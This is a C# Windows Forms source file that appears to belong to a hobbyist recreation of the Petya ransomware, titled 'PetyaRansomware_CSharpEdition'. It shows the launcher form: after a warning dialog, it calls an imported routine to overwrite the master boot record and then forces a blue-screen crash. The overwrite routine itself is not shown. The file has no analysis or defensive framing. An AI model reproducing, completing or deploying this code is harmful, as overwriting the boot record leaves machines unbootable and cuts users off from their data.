using Petya.MBR;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PetyaRansomware_CSharpEdition
{
    public partial class petya_start : Form
    {
        public petya_start()
        {
            InitializeComponent();
            if(MessageBox.Show("WARNING!!! It's Dangerous Virus(Petya Ransomware), Do u want to run this Malware?!?!", "Petya", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
                PetyaMBR pet = new PetyaMBR();
                pet.MBROverwrite();
                pet.CallBSOD();
            }
            else
            {
                Environment.Exit(0123);
            }
        }
    }
}
